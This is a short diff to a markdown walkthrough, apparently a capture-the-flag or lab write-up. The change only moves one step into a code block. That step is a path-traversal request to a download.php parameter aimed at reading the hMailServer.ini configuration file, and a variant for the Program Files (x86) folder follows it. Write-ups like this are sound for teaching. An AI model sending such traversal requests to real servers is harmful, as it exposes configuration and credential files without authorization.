@@ -142,8 +142,10 @@ The .ini file is named hMailServer.ini  and it's located at the \bin directory
 
 <img width="1525" height="252" alt="image" src="https://github.com/user-attachments/assets/689c5060-2f81-4260-913f-a9672ad5c06d" />
 
-Now we can combine the info we alread know and the pathway should be: C:\Program Files\hMailServer\Bin\hmailserver.ini so let's try the request passing this as a parameter: GET /download.php?file=..\..\Program+Files\hmailServer\Bin\hMailServer.ini HTTP/1.1
-
+Now we can combine the info we alread know and the pathway should be: C:\Program Files\hMailServer\Bin\hmailserver.ini so let's try the request passing this as a parameter:
+````
+GET /download.php?file=..\..\Program+Files\hmailServer\Bin\hMailServer.ini HTTP/1.1
+````
 <img width="1598" height="752" alt="image" src="https://github.com/user-attachments/assets/bd747d67-96c0-43ab-a9c1-738d5ae2aa65" />
 
 Does not work, maybe hmailserver waws installed as 32 bit, try this: GET /download.php?file=..\..\Program+Files+(x86)\hmailServer\Bin\hMailServer.ini HTTP/1.1
